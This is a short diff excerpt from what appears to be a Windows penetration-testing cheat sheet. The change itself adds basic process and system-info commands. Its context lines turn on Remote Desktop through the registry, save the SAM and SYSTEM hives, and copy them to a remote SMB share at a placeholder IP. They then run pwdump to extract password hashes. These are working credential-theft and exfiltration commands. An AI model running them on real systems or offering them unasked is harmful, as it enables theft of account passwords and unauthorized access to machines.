@@ -35,8 +35,15 @@ reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnec
 # SAM Crack 
 reg save HKLM\SAM sam.backup
 reg save HKLM\SYSTEM system.backup
-
+-
 copy sam.backup \\IP\smbfolder\sam
 copy system.backup \\IP\smbfolder\system
-
+-
 pwdump system sam
+
+# CMD
+tasklist
+taskkill /pid 1234
+taskkill /F /IM notepad.exe
+systeminfo
+
